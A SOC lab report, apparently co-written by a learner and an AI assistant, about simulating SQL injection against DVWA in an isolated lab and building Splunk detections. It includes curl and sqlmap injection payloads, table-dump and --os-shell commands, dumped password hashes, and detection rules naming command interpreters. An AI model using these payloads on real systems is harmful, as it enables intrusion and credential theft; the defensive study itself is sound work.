# SQL Injection Attack Simulation — MITRE ATT&CK Detection Engineering

**Lab operator:** Shankar (executed attack simulation, ran queries, captured evidence)
**Report author:** Claude (AI assistant — analysed telemetry, structured findings, drafted documentation)
**Lab environment:** Three-VM SOC lab on VMware Workstation
**Date:** May 2026
**Status:** Complete (Phases 1–5)

**Repository purpose:** Personal learning project documenting an end-to-end SQL injection attack simulation against DVWA and the corresponding SOC detection analysis. This is a record of a structured learning exercise — not a claim of independent expertise. The lab operator is actively learning SOC analyst skills; AI assistance was used for analysis, query construction, and documentation. The concepts documented here will be revisited through self-study before being claimed as independently mastered.

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Lab Architecture](#2-lab-architecture)
3. [MITRE ATT&CK Mapping](#3-mitre-attck-mapping)
4. [Phase Walkthroughs](#4-phase-walkthroughs)
   - [Phase 1: Reconnaissance](#phase-1--reconnaissance-t1595002)
   - [Phase 2: Manual SQL Injection](#phase-2--manual-sql-injection-t1190)
   - [Phase 3: Automated Exploitation](#phase-3--automated-exploitation-sqlmap-t1190--t1083--t1552)
   - [Phase 4: Offline Credential Cracking](#phase-4--offline-credential-cracking-t1110002)
   - [Phase 5: OS Pivot via Webshell](#phase-5--os-pivot-attempt-t1505003--t1059003)
5. [Detection Coverage Matrix](#5-detection-coverage-matrix)
6. [Findings & Gaps](#6-findings--gaps)
7. [Production Detection Rules](#7-production-detection-rules-splunk-spl)
8. [Recommendations](#8-recommendations)
9. [Appendices](#9-appendices)

---

## 1. Executive Summary

This project simulated a complete SQL injection attack chain against an intentionally vulnerable web application (DVWA) in a controlled lab environment, then analysed the resulting telemetry to determine which detection methods successfully identified each attack phase. The simulation followed the **MITRE ATT&CK framework**, covering reconnaissance through attempted host compromise across five distinct phases.

**Key outcomes:**

- **Five attack phases executed end-to-end** with full evidence preservation (logs, payloads, response artefacts).
- **Three log sources analysed** in parallel: Apache access/error logs, Windows Firewall logs, and Sysmon process/file events — all centralised in Splunk.
- **25+ detection methods tested** across signature-based and behavioural categories.
- **Critical compromise demonstrated** at the data layer (full credential extraction with passwords cracked inline).
- **Defense in depth held** at the host layer — the webshell deployment attempt failed across three independent control layers.
- **Production-ready detection rules** derived directly from observed attack telemetry, deployable to any Splunk-equipped SOC.

**Headline finding:** Signature-based detections (User-Agent matching, known payload patterns) caught noisy automated attacks effortlessly but failed entirely against a careful manual attacker. Behavioural detections — request volume anomalies, response size deviation, payload uniqueness ratios — caught both. **A SOC relying only on signature rules is bypassed by `sqlmap --random-agent` in seconds. Defense in depth requires stacking detection paradigms.**

---

## 2. Lab Architecture

### Network topology

```
                    VMnet10 (10.10.10.0/24)
                    No internet egress
   ┌──────────────────────┬───────────────────────┐
   │                      │                       │
   │   Kali Linux         │   Windows 10          │
   │   10.10.10.5         │   10.10.10.10         │
   │   ──────────         │   ────────────        │
   │   Attacker           │   Apache 2.4.58       │
   │   sqlmap 1.10.3      │   PHP 8.0.30          │
   │   nmap, gobuster     │   MariaDB (XAMPP)     │
   │   curl               │   DVWA (Security=Low) │
   │                      │   Sysmon 15.x         │
   │                      │   Splunk Enterprise   │
   │                      │   Splunk UF           │
   │                      │                       │
   └──────────────────────┴───────────────────────┘
              │                       │
              └───────────┬───────────┘
                          │
                  FortiGate 10.10.10.1
                  (gateway, blind to
                   same-subnet traffic)
```

### Splunk indexes & sourcetypes

| Index | Sourcetypes | Source description |
|---|---|---|
| `main` | `access_combined` | Apache access.log — every HTTP request to DVWA |
| `main` | `apache_error` | Apache error.log — server-side errors |
| `main` | `winfirewall` | Windows Firewall connection log |
| `sysmon` | `xmlwineventlog:microsoft-windows-sysmon/operational` | Sysmon process create (EID 1), network connect (EID 3), file create (EID 11), registry mod (EID 13) |

### Methodology note — scope of simulation

This simulation models **post-authentication SQL injection** — the attacker is assumed to have already obtained a valid DVWA session cookie via one of:

- **Valid Accounts (T1078)** — stolen, leaked, or insider credentials
- **Steal Web Session Cookie (T1539)** — XSS, MitM, or browser-based theft
- **Brute Force (T1110)** — weak password successfully cracked

The session cookie was supplied manually to each attack script. This isolates the SQL injection detection problem from authentication-layer concerns. In production, additional detections would be required to identify the *acquisition* of the session — anomalous logins, impossible travel, brute-force alerting, XSS pattern detection on other endpoints.

---

## 3. MITRE ATT&CK Mapping

| Phase | MITRE Technique | Tactic | Action in this lab |
|---|---|---|---|
| **1** | [T1595.002 — Active Scanning: Vulnerability Scanning](https://attack.mitre.org/techniques/T1595/002/) | Reconnaissance | nmap service scan, whatweb fingerprint, gobuster directory enumeration |
| **2** | [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | Initial Access | Manual SQLi probes via curl — error-based, boolean, UNION-based |
| **3** | T1190 + [T1083 — File and Directory Discovery](https://attack.mitre.org/techniques/T1083/) + [T1552 — Unsecured Credentials](https://attack.mitre.org/techniques/T1552/) | Discovery + Credential Access | sqlmap full enumeration + credential dump |
| **4** | [T1110.002 — Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) | Credential Access | Offline MD5 cracking (sqlmap auto-cracked inline) |
| **5** | [T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) + [T1059.003 — Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) | Persistence + Execution | Attempted webshell deployment via sqlmap `--os-shell` |

---

## 4. Phase Walkthroughs

### Phase 1 — Reconnaissance (T1595.002)

**Goal:** Map the target's attack surface — discover open ports, identify web technologies, enumerate accessible directories.

**Commands executed (Kali):**
```bash
# Service & version scan
nmap -sV -p 80,443,3306,8080 10.10.10.10

# Web tech fingerprinting
whatweb http://10.10.10.10/DVWA/

# Directory bruteforce
gobuster dir -u http://10.10.10.10/DVWA/ \
  -w /usr/share/wordlists/dirb/common.txt -t 20
```

**Attack profile:** Loud and fast — ~4,600 HTTP requests in ~2 minutes, all from one source IP, against many non-existent paths.

#### Detection results

| Detection method | Splunk query (abbreviated) | Result | Status |
|---|---|---|---|
| Volume anomaly | `timechart span=10s count` from one IP | Sharp plateau, ~38 req/sec for 2 min | ✅ Fired |
| 404 burst | `status=404 \| stats count by clientip` | 4,596 events from one IP | ✅ Fired |
| Unique path ratio | `dc(uri) as unique_404s` | 4,596 unique paths (100%) | ✅ Fired |
| Tool User-Agent | `stats count by useragent` | `gobuster/3.8.2` (4615), `WhatWeb/0.6.3` (2), `Nmap NSE` (4) | ✅ Fired |
| Apache error.log spikes | `index=main sourcetype=apache_error` | 35 events incl. Windows reserved-name lookups (`con`, `nul`, `lpt1`, `aux`) — wordlist-OS mismatch | ✅ Fired (bonus) |

**Key insight:** Recon is the easiest phase to detect — every signature and behavioural rule fires. The Windows reserved-name errors in `apache_error.log` were an unexpected bonus signal — a Linux-aware wordlist hitting a Windows-hosted server leaves a unique fingerprint.

---

### Phase 2 — Manual SQL Injection (T1190)

**Goal:** Demonstrate the canonical SQL injection techniques manually, generating low-volume but high-impact traffic that automated detection often misses.

**Commands executed (Kali):**
```bash
# 8 hand-crafted curl probes — each targeting a different SQLi technique
COOKIE="PHPSESSID=<sess>; security=low"
URL="http://10.10.10.10/DVWA/vulnerabilities/sqli/"

curl -b "$COOKIE" "$URL?id=1&Submit=Submit"                              # baseline
curl -b "$COOKIE" "$URL?id=1'&Submit=Submit"                              # error-based
curl -b "$COOKIE" "$URL?id=1'+OR+'1'='1&Submit=Submit"                    # boolean tautology
curl -b "$COOKIE" "$URL?id=1'+--+&Submit=Submit"                          # comment terminator
curl -b "$COOKIE" "$URL?id=1'+UNION+SELECT+NULL--+&Submit=Submit"         # UNION column count (1)
curl -b "$COOKIE" "$URL?id=1'+UNION+SELECT+NULL,NULL--+&Submit=Submit"    # UNION column count (2)
curl -b "$COOKIE" "$URL?id=1'+UNION+SELECT+user,password+FROM+users--+"   # data extraction
curl -b "$COOKIE" "$URL?id=1'+UNION+SELECT+null,version()--+"             # DBMS fingerprint
```

**Attack profile:** Surgical — 8 requests over 7 seconds, all returning HTTP 200, low volume, indistinguishable from a human user clicking around.

#### SQLi types demonstrated

| Probe | Type | Technique |
|---|---|---|
| 2 | **Error-based** | Force SQL syntax error, observe response shape change |
| 3 | **Boolean-based (tautology)** | `OR '1'='1'` makes WHERE always true → returns all rows |
| 4 | Comment injection | `--` terminates the rest of the original query |
| 5–6 | **UNION-based (column discovery)** | Probe column count required for UNION SELECT |
| 7 | **UNION-based (extraction)** | Dump `users` table — usernames and password hashes |
| 8 | UNION-based (fingerprinting) | `version()` reveals DBMS version |

#### Response size signature — the key finding

All probes returned HTTP 200, but the response body sizes told the entire story:

| Probe | Payload | Bytes | Interpretation |
|---|---|---|---|
| 1 (baseline) | `id=1` | 4,651 | Normal 1-row response |
| 2 | `id=1'` | **163** | 🔴 SQL error — page broke |
| 3 | `id=1' OR '1'='1` | 4,939 | 🟢 All 5 users returned (tautology worked) |
| 4 | `id=1' -- ` | 4,656 | 🟢 Comment terminator valid |
| 5 | `... UNION SELECT NULL-- ` | **72** | 🔴 Column count mismatch error |
| 6 | `... UNION SELECT NULL,NULL-- ` | 4,754 | 🟢 2-column UNION accepted |
| 7 | `... UNION SELECT user,password FROM users-- ` | **5,335** | 💀 Credentials extracted |
| 8 | `... UNION SELECT null,version()-- ` | 4,779 | 🟢 DBMS version disclosed |

#### Credential dump (T1552)

```
admin   : 5f4dcc3b5aa765d61d8327deb882cf99
gordonb : e99a18c428cb38d5f260853678922e03
1337    : 8d3533d75ae2c3966d7e0d4fcc69216b
pablo   : 0d107d09f5bbe40cade3de5c71e9e9b7
smithy  : 5f4dcc3b5aa765d61d8327deb882cf99   ← same hash as admin (password reuse)
```

#### Detection results

| Detection method | Result | Status |
|---|---|---|
| Volume anomaly | 8 events in 7s — well below any reasonable threshold | ❌ Failed |
| 404 ratio | All 200s | ❌ Failed |
| Tool User-Agent | `curl/8.19.0` — too generic to alert on | ❌ Failed |
| **SQL metacharacters in URL** | 7/7 probes contained `'`, `UNION`, `SELECT`, or `--` | ✅ **Fired** |
| **Response size deviation** | Bytes ranged 72–5335 (vs 4651 baseline) — clear bimodal cluster | ✅ **Fired** |
| Apache error.log | **0 events** — DVWA's PHP returns errors to client, doesn't log them | ❌ Failed |
| Windows Firewall | 0 attack-related events — only logs drops, not allows | ❌ Failed |

**Key insight:** Phase 2 invalidates four of the five detection methods that worked beautifully for Phase 1 recon. Manual targeted SQLi by a careful attacker generates almost no traditional signals. Only payload pattern matching and response-size behavioural analysis succeed.

> **Critical finding:** Apache `error.log` contained zero events for probes 2 and 5 despite both returning SQL errors to the client. DVWA echoes `mysqli_error()` output directly into the HTTP response — PHP's `error_log` mechanism is never invoked. **Configure `php.ini` with `log_errors = On` and a defined `error_log` path** to close this gap in production.

---

### Phase 3 — Automated Exploitation (sqlmap, T1190 + T1083 + T1552)

**Goal:** Replicate Phase 2's manual attack at machine speed, demonstrating what automation provides over manual exploitation and how detection profiles change with volume.

**Commands executed (Kali):**
```bash
# Full attack chain: detect → fingerprint → enumerate DBs → enumerate tables → dump
TARGET="http://10.10.10.10/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE="PHPSESSID=<sess>; security=low"
COMMON="-u $TARGET --cookie=$COOKIE --batch --flush-session"

sqlmap $COMMON --banner --current-user --current-db --is-dba
sqlmap $COMMON --dbs
sqlmap $COMMON -D dvwa --tables
sqlmap $COMMON -D dvwa -T users --dump
```

**Attack profile:** Loud, methodical, exhaustive. **632 requests over 9.5 minutes**, sustained rate ~1 req/sec, 593 unique payloads (94% uniqueness).

#### What sqlmap discovered (from its session log)

```
back-end DBMS              : MySQL >= 5.1 (MariaDB fork)
web application technology : Apache 2.4.58, PHP 8.0.30
web server operating system: Windows
Database: dvwa
Table: users (5 entries) — fully dumped + hashes cracked inline:
  admin   : password
  gordonb : abc123
  1337    : charley
  pablo   : letmein
  smithy  : password
```

#### Payload diversity — the bypass-resistant signature

The 632 requests contained **593 unique URL query strings** (93.8% uniqueness). sqlmap deliberately randomises padding to evade exact-string blocklists:

```
id=1' AND (SELECT 1325 FROM (SELECT(SLEEP(5)))BStn)-- wwfX        ← random int + random alias + random suffix
id=1' AND (SELECT 3442 FROM (SELECT(SLEEP(5)))ZGJT)-- KDxr        ← same technique, different randoms
id=1' AND (SELECT 4466 FROM (SELECT(SLEEP(5)))XqkD)-- yVjb
```

Hex encoding of identifiers also observed (anti-WAF technique):
```
0x64767761 = 'dvwa'    (MySQL user, hex-encoded to avoid string-literal WAF rules)
0x59       = 'Y'       (boolean comparison target)
0x71707a6b71 = 'qpzkq' (random delimiter for output parsing)
```

#### Detection results

| Detection method | Result | Status |
|---|---|---|
| **Volume anomaly** | 632 events sustained for 9.5 min — flat plateau | ✅ Fired |
| **Tool User-Agent** | 626/632 = `sqlmap/1.10.3#stable (https://sqlmap.org)` | ✅ Fired |
| **Payload uniqueness ratio** | 593/632 = 94% unique payloads | ✅ Fired |
| **Response size diversity** | 63 unique response sizes (vs 8 in Phase 2) | ✅ Fired |
| **Response size deviation** | 3 distinct clusters: errors (~150b), normal (~4600b), extraction (~5000b+) | ✅ Fired |
| **Hex-encoded SQL identifiers** | 66 events containing `0x...` in URL query string | ✅ Fired |
| 404 ratio | All 200s on valid endpoint | ❌ N/A for this phase |
| Apache error.log | (same gap as Phase 2) | ❌ Failed |

**Key insight:** Phase 3 catches with five independent detection layers compared to Phase 2's two. The same vulnerability, same target — but noisier attack profile = dramatically more signal. **Detection difficulty correlates inversely with attacker skill.**

> **UA bypass note:** The 626 events identifying as `sqlmap` would drop to **zero** with one additional flag (`--random-agent`). Signature detection on tool names is trivially bypassed. Behavioural detections (volume, uniqueness ratio, size diversity) survive UA spoofing — this is why defense in depth matters.

---

### Phase 4 — Offline Credential Cracking (T1110.002)

**Goal:** Demonstrate that the post-exploitation credential cracking phase generates no network telemetry, exposing a SOC blind spot.

**What happened:** sqlmap's `--dump` step automatically detected the MD5 hash format and invoked its built-in `wordlist.tx_` against the extracted hashes — **inline, during Phase 3, on the Kali host**.

Five users, four unique hashes (admin and smithy shared a password), all cracked in seconds against a 1.2M-word built-in list.

#### Detection results

| Detection method | Result | Status |
|---|---|---|
| Apache logs | 0 cracking-related events | ❌ N/A — offline activity |
| Sysmon | 0 cracking-related events | ❌ N/A — offline activity |
| Suricata | 0 cracking-related events | ❌ N/A — offline activity |
| Windows Firewall | 0 cracking-related events | ❌ N/A — offline activity |

**Key insight: this is the SOC blind spot.** Credential cracking is offline, local, silent. The only indirect signal is the **preceding `--dump` request in Apache logs** (visible in Phase 3 telemetry). Once the attacker has the hashes, the cracking activity is invisible. Defense against this phase must occur **before** (prevent the extraction) or **after** (detect compromise via anomalous logins) — never during.

---

### Phase 5 — OS Pivot Attempt (T1505.003 + T1059.003)

**Goal:** Attempt to escalate SQL injection into full OS command execution via sqlmap's `--os-shell` feature — drop a webshell to disk and execute Windows commands as the Apache user.

**Commands executed (Kali):**
```bash
sqlmap -u "http://10.10.10.10/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<sess>; security=low" \
  --os-shell \
  --flush-session
```

**Outcome: ATTACK FAILED — defense in depth held across three independent layers.**

#### What sqlmap tried

sqlmap attempted to drop ASP file stagers (despite the server running Apache+PHP) into 20 different directory guesses, including:
```
/Inetpub/wwwroot/                              (IIS default — not present)
/Inetpub/wwwroot/DVWA/vulnerabilities/sqli/    (IIS + DVWA — not present)
/htdocs/                                       (generic Apache — not present)
/htdocs/DVWA/                                  (generic Apache — not present)
/sqli/                                         (relative path guess — not present)
... etc.
```

The XAMPP-specific path `C:/xampp/htdocs/` was never in sqlmap's default guesslist.

#### What stopped the attack (defense in depth)

| Defense layer | Mechanism | Evidence |
|---|---|---|
| **1. DBMS file write** | MariaDB `secure_file_priv` / restricted FILE privileges | sqlmap log: `it looks like the file has not been written` |
| **2. Apache request size limit** | `LimitRequestLine` rejected 8KB+ GET payloads | 13 HTTP 414 errors logged |
| **3. File format mismatch** | sqlmap uploaded `.asp` to Apache+PHP — wouldn't execute even if written | Wrong language assumption based on OS=Windows alone |
| **4. Path discovery** | sqlmap's webroot list didn't include XAMPP's `C:/xampp/htdocs/` | All 54 upload attempts returned 404 |

#### Detection results

| Detection signal | Result | Status |
|---|---|---|
| **HTTP 414 burst** | 13 events in 5 seconds, all same size (347b error page) | ✅ **Fired** — high-confidence signal |
| **Webshell stager 404 hunt** | 54 events targeting `tmp[a-z]{4,8}.asp` paths across 20 directories | ✅ **Fired** — strong behavioural signature |
| **Behavioural rule (tmp+random+ext pattern)** | 108 events matched the deployment-attempt pattern | ✅ **Fired** — production-grade rule |
| Sysmon EID 1 — `httpd.exe → cmd.exe` | **0 events** | ✅ Negative confirmation (no compromise) |
| Sysmon EID 11 — `.php` file creation | **0 events** | ✅ Negative confirmation (no persistence) |

**Key insight:** The failed attack generated stronger detection signals than many successful attacks. HTTP 414 errors are vanishingly rare in legitimate traffic — even three from one IP is highly suspicious. The randomly-named `.asp` file 404 storm is a near-perfect sqlmap signature.

> **Critical caveat:** This defensive outcome should not be relied upon. Different DBMS configurations, web servers, or file write paths could allow the SQLi-to-RCE pivot. The Phase 3 credential dump alone constitutes a critical breach. **The underlying SQL injection vulnerability must be patched regardless of whether it can be escalated to RCE.**

---

## 5. Detection Coverage Matrix

Cross-cutting view of which detection methods fired in which phase. ✅ = detected the attack, ❌ = did not detect, n/a = not applicable.

| Detection method | P1 Recon | P2 Manual SQLi | P3 sqlmap | P4 Cracking | P5 Webshell attempt |
|---|:---:|:---:|:---:|:---:|:---:|
| **Volume anomaly** (>100 req/min) | ✅ | ❌ | ✅ | n/a | ❌ |
| **404 ratio anomaly** | ✅ | ❌ | ❌ | n/a | ✅ |
| **Tool User-Agent signatures** | ✅ | ❌ | ✅ | n/a | ❌ |
| **SQL keywords in URL** | ❌ | ✅ | ✅ | n/a | ❌ |
| **Response size deviation** | ❌ | ✅ | ✅ | n/a | ❌ |
| **Payload uniqueness ratio** | ✅ | ✅ | ✅ | n/a | ❌ |
| **Apache error.log spikes** | ✅ | ❌ | ❌ | n/a | ❌ |
| **HTTP 414 (URI Too Long)** | ❌ | ❌ | ❌ | n/a | ✅ |
| **Random-named script file hunt** | ❌ | ❌ | ❌ | n/a | ✅ |
| **Hex-encoded identifiers in URL** | ❌ | ❌ | ✅ | n/a | ❌ |
| **Sysmon httpd→child process** | n/a | n/a | n/a | n/a | ✅ (negative — 0 events confirms safe) |
| **Sysmon `.php` file creation** | n/a | n/a | n/a | n/a | ✅ (negative — 0 events confirms safe) |
| Windows Firewall | ❌ | ❌ | ❌ | n/a | ❌ |
| FortiGate (same-subnet — architectural blind spot) | n/a | n/a | n/a | n/a | n/a |

### Coverage analysis

- **No single detection method covers all phases.** Volume anomaly catches three phases but misses Phase 2 entirely. Payload signatures catch three but miss Phase 1 recon. Response-size analysis is strong for SQLi phases but irrelevant to recon.
- **Defense in depth is empirically required.** Any production SOC monitoring only User-Agent signatures gets bypassed the moment the attacker uses `--random-agent`.
- **Negative confirmations matter.** The two `0 events` results from Sysmon in Phase 5 prove the host stayed safe — that's as important an output as the attack signals.

---

## 6. Findings & Gaps

### Finding 1: PHP errors do not propagate to Apache error.log

**Evidence:** Phase 2 generated SQL syntax errors visible in HTTP response bodies (Probe 2: 163-byte error page). Zero corresponding events in `index=main sourcetype=apache_error` during the attack window.

**Root cause:** DVWA's `vulnerabilities/sqli/source/low.php` uses `mysqli_error()` to capture and echo errors directly into the HTML response. PHP's `error_log` mechanism is never invoked, so errors never reach Apache's logging pipeline.

**Impact:** A SOC monitoring only access.log + error.log would miss valuable signal. The HTTP 200 status on error responses masks the failure at the log layer.

**Mitigation:**
- Configure `php.ini`: `log_errors = On` and `error_log = C:/xampp/php/logs/php_error.log`
- Add the PHP error log path to the Splunk forwarder's `inputs.conf`
- Apply secure error-handling pattern in application code: log server-side, return generic message to client

### Finding 2: Windows Firewall captures negligible attack telemetry by default

**Evidence:** During the test window, 13,689 winfirewall events were recorded — overwhelmingly internal Splunk forwarder traffic (TCP/8089 loopback) and Windows multicast name resolution drops. Zero events from the actual attack traffic to port 80.

**Root cause:** Default Windows Firewall logging captures dropped packets only. Allowed inbound traffic to permitted ports is not logged.

**Mitigation:**
```cmd
netsh advfirewall set allprofiles logging allowedconnections enable
netsh advfirewall set allprofiles logging maxfilesize 32768
```
Even after enabling, Windows Firewall provides only L3/L4 metadata — no HTTP payload visibility. Apache logs remain authoritative for web attack analysis.

### Finding 3: FortiGate cannot see intra-subnet traffic

**Evidence:** All attack traffic in this simulation occurred within `10.10.10.0/24` (Kali → Windows). Zero FortiGate events for the attack.

**Root cause:** FortiGate is the network gateway. Same-subnet hosts communicate directly via switching — traffic never reaches the FortiGate.

**Mitigation:** Network segmentation. Move web servers to a separate VLAN (e.g., `10.10.20.0/24` — DMZ) so all client traffic must route through FortiGate. This was scoped out of this simulation but is a known lab roadmap item.

### Finding 4: Tool User-Agent detection is trivially bypassed

**Evidence:** Phase 1 (gobuster) and Phase 3 (sqlmap) both used default User-Agents identifying the tool by name. All hits caught by `useragent="*sqlmap*"` or `useragent="*gobuster*"`.

**Bypass complexity:** One command-line flag — `sqlmap --random-agent`, `gobuster -a "Mozilla/5.0..."`.

**Mitigation:** Do not rely on UA-based rules alone. Stack with behavioural rules (volume, uniqueness ratio, response size analysis) that survive UA spoofing. UA rules are still valuable as low-effort first-line filters — they catch low-skill attackers and act as a tripwire — but should never be the only layer.

### Finding 5: Offline credential cracking is invisible to network sensors

**Evidence:** Phase 4 (hash cracking, performed inline by sqlmap during Phase 3) generated zero events in any monitored log source.

**Root cause:** Offline cryptographic operations on the attacker's host produce no observable signal from the defender's perspective.

**Mitigation:** Detection must occur at adjacent phases — prevent the extraction (T1552 detection) or detect post-cracking compromise (anomalous logins from new IPs, impossible travel, geolocation mismatches, MFA bypass attempts).

### Finding 6: Defense in depth blocked SQLi-to-RCE escalation

**Evidence:** Phase 5 attempted webshell deployment failed across at least three independent defensive layers (DBMS `secure_file_priv`, Apache `LimitRequestLine`, and language/path mismatch).

**Caveat:** This outcome is configuration-dependent. The same SQL injection on a host with permissive `secure_file_priv`, larger request size limits, and discoverable webroot paths would likely succeed. **The defensive outcome is not a substitute for patching the underlying vulnerability.**

---

## 7. Production Detection Rules (Splunk SPL)

The following rules are derived directly from observed attack telemetry in this lab. Each is designed for production deployment as a Splunk saved search or scheduled alert.

### Rule 1: Directory bruteforce detection (catches gobuster, dirb, ffuf, dirbuster)

```spl
index=main sourcetype=access_combined earliest=-5m
| stats count, dc(uri) as unique_paths by clientip
| where count > 100 AND unique_paths = count
| eval description="Directory enumeration: every request a different URI — signature of wordlist-based bruteforce"
```

**Why it works:** Legitimate users repeat URIs. Bruteforce tools walk a wordlist, producing `count == unique_paths` ratio approaching 1.0.

### Rule 2: SQL injection metacharacter detection

```spl
index=main sourcetype=access_combined earliest=-15m
| eval payload = urldecode(uri_query)
| where match(payload, "(?i)(\bUNION\b\s+(ALL\s+)?\bSELECT\b|\bORDER\s+BY\b\s+\d+|\bSLEEP\(|\bBENCHMARK\(|\bCASE\s+WHEN\b|\bINFORMATION_SCHEMA\b|'\s*OR\s*'?\d+'?\s*=\s*'?\d+)")
| stats count, values(payload) as payloads by clientip uri_path
| where count > 3
```

**Why it works:** Matches SQL keywords in URL-decoded payloads. Multiple matches from one IP to one endpoint = active SQLi probing.

### Rule 3: Response size deviation (behavioural — bypass-resistant)

```spl
index=main sourcetype=access_combined uri_path="*sqli*" OR uri_path="*search*" OR uri_path="*login*"
  earliest=-1h
| eventstats avg(bytes) as avg_bytes, stdev(bytes) as stdev_bytes by uri_path
| eval z_score = abs((bytes - avg_bytes) / stdev_bytes)
| where z_score > 2
| table _time clientip uri_path uri_query bytes avg_bytes z_score
```

**Why it works:** Even payload-obfuscated SQLi cannot hide response-size changes. Catches errors (small responses) AND data extraction (large responses) regardless of payload encoding.

### Rule 4: Automated tool signature ("first line of defense")

```spl
index=main sourcetype=access_combined earliest=-15m
| eval tool_match = case(
    match(useragent, "(?i)sqlmap"),    "sqlmap",
    match(useragent, "(?i)gobuster"),  "gobuster",
    match(useragent, "(?i)dirbuster"), "dirbuster",
    match(useragent, "(?i)nikto"),     "nikto",
    match(useragent, "(?i)nmap"),      "nmap",
    match(useragent, "(?i)whatweb"),   "whatweb",
    match(useragent, "(?i)hydra"),     "hydra",
    match(useragent, "(?i)wpscan"),    "wpscan",
    1=1, null())
| where isnotnull(tool_match)
| stats count by clientip tool_match
```

**Why it works:** Catches low-skill attackers using default tool configurations. Bypassed trivially with `--random-agent`, so layer with Rules 1–3.

### Rule 5: Webshell deployment attempt (file-stager pattern)

```spl
index=main sourcetype=access_combined status=404 earliest=-15m
| regex uri_path="(?i)/tmp[a-z0-9]{4,8}\.(php|asp|aspx|jsp)$"
| stats count, dc(uri_path) as unique_attempts by clientip
| where count > 3
```

**Why it works:** Random-named temporary script files (`tmpucdtc.asp`, `tmputrbn.asp`) are sqlmap's stager naming convention. Near-zero false-positive rate in legitimate traffic.

### Rule 6: Hex-encoded SQL identifiers (anti-WAF evasion detection)

```spl
index=main sourcetype=access_combined earliest=-15m
| regex uri_query="0x[0-9a-fA-F]{4,}"
| stats count, dc(uri_query) as unique_payloads by clientip uri_path
| where count > 3
```

**Why it works:** Hex literals (`0x64767761`) are standard sqlmap WAF-evasion. Vanishingly rare in legitimate HTTP traffic.

### Rule 7: HTTP 414 burst (oversized payload attempt)

```spl
index=main sourcetype=access_combined status=414 earliest=-15m
| stats count, dc(uri_path) as unique_paths by clientip
| where count > 3
```

**Why it works:** HTTP 414 (URI Too Long) is rare in legitimate traffic. Multiple from one IP signals payload-size-based attack — webshell stagers, command injection attempts, buffer overflow probes.

### Rule 8: 🔴 CRITICAL — Apache spawning command interpreter (T1059.003)

```spl
index=sysmon EventCode=1
  ParentImage IN ("*\\httpd.exe", "*\\apache.exe", "*\\nginx.exe",
                  "*\\php-cgi.exe", "*\\w3wp.exe")
  Image IN ("*\\cmd.exe", "*\\powershell.exe", "*\\pwsh.exe",
            "*\\wscript.exe", "*\\cscript.exe", "*\\bash.exe")
```

**Why it works:** In normal operation, web server processes do not spawn command interpreters. Period. This is the highest-confidence detection in the entire ruleset. **A single hit on this rule is sufficient grounds for an incident response page-out.**

### Rule 9: 🔴 CRITICAL — webshell file creation

```spl
index=sysmon EventCode=11
  Image IN ("*\\httpd.exe", "*\\php*.exe", "*\\w3wp.exe",
            "*\\mysqld.exe", "*\\mariadbd.exe")
  TargetFilename IN ("*.php", "*.asp", "*.aspx", "*.jsp", "*.jspx")
  NOT TargetFilename="*\\Apache*\\htdocs\\*deploy*"
```

**Why it works:** Web server processes writing executable script files is anomalous in steady-state operation. Combine with file path allowlist for deployment workflows to reduce false positives.

---

## 8. Recommendations

### For the lab environment

1. **Patch the SQLi vulnerability** — set DVWA Security to Medium/High and re-run Phase 3 to validate prepared-statement defense.
2. **Enable PHP error logging** — `log_errors = On`, dedicated log path, index in Splunk to close Finding 1's gap.
3. **Implement VLAN segmentation** — separate Kali (attacker), Windows (target), and DMZ traffic so FortiGate sees all inter-VM flow. Currently a lab roadmap item.
4. **Enable Windows Firewall allowed-connection logging** for visibility into permitted inbound traffic to port 80 / 443.
5. **Deploy Suricata local.rules for intra-HOME_NET traffic** with `alert http any any -> any any` orientation, since ET Open rules assume EXTERNAL_NET → HOME_NET direction.

### For production SOC deployment

1. **Layer detection paradigms.** No single rule type catches all attack profiles. Combine:
   - Signature-based (UA, payload patterns) for low-effort tripwires
   - Behavioural-based (volume, uniqueness ratio, response size) for bypass-resistance
   - Negative-confirmation rules (process-tree anomalies) for high-fidelity critical alerts

2. **Tune thresholds against baseline.** Rules 1 and 3 require baselines of normal request rates and response sizes for the protected endpoints. Run for 7–30 days in detection-only mode before alerting.

3. **Prioritise Rules 8 and 9 above all others.** Process-tree anomalies on web servers are the highest-fidelity SOC signal available. False-positive rate near zero. Single-hit page-out is appropriate.

4. **Log forwarder health monitoring.** This simulation revealed that Phase 2 SQL errors never reached Splunk despite local generation — only systematic checks of "events received per source per hour" catches collection-pipeline silent failures.

5. **WAF deployment ahead of vulnerable apps.** ModSecurity with OWASP CRS would catch most payloads in this simulation at the request layer, before they reach the application. Even a poorly-tuned WAF is a meaningful additional layer.

6. **Patch underlying vulnerabilities.** Defensive configuration (Phase 5 outcome) is not a substitute for fixing input validation in application code. Use parameterised queries / prepared statements universally.

---

## 9. Appendices

### Appendix A: Lab software versions

| Component | Version |
|---|---|
| Kali Linux | Rolling (May 2026) |
| sqlmap | 1.10.3#stable |
| nmap | 7.95 |
| gobuster | 3.8.2 |
| Windows 10 victim | 22H2 |
| Apache (XAMPP) | 2.4.58 |
| PHP | 8.0.30 |
| MariaDB (XAMPP) | 10.x |
| DVWA | 1.10 (Security=Low) |
| Sysmon | 15.x |
| Splunk Enterprise | 9.x |

### Appendix B: Sample sqlmap payloads observed

Documented evasion techniques used by sqlmap during Phase 3, captured from `access_combined`:

**Time-based blind with random padding:**
```
id=1' AND (SELECT 1325 FROM (SELECT(SLEEP(5)))BStn)-- wwfX
id=1' AND (SELECT 3442 FROM (SELECT(SLEEP(5)))ZGJT)-- KDxr
id=1' AND (SELECT 4466 FROM (SELECT(SLEEP(5)))XqkD)-- yVjb
```

**Boolean-based blind with random integers (paired TRUE/FALSE):**
```
id=(SELECT (CASE WHEN (6148=6148) THEN 1 ELSE (SELECT 2599 UNION SELECT 6870) END))
id=(SELECT (CASE WHEN (1841=5660) THEN 1 ELSE (SELECT 5660 UNION SELECT 3957) END))
```

**UNION-based privilege check with hex-encoded identifiers:**
```
id=1' UNION ALL SELECT CONCAT(0x71707a6b71,
